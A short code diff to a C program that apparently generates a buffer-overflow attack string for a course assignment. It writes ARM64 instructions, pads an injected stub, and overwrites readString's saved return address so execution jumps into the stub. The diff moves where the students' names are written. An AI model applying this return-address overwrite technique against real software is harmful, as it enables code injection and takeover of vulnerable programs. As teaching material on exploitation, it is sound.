@@ -52,13 +52,14 @@ int main(void)
     fwrite(&instr, 4, 1, f);  pc += 4;
 
 
-    fprintf(f, "Ben Zhou and Owen Clarke");
 
     /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
-    for (; pc < NAME_ADDR + 25; pc += 4) {
+    for (; pc < NAME_ADDR + 24; pc += 4) {
         instr = MiniAssembler_mov(0, 0);
         fwrite(&instr, 4, 1, f);
     }
+    fprintf(f, "Ben Zhou and Owen Clarke");
+
 
     /* 3) Overwrite readString’s saved x30 with NAME_ADDR
         so that when readString does `ret`, it jumps into our stub. */
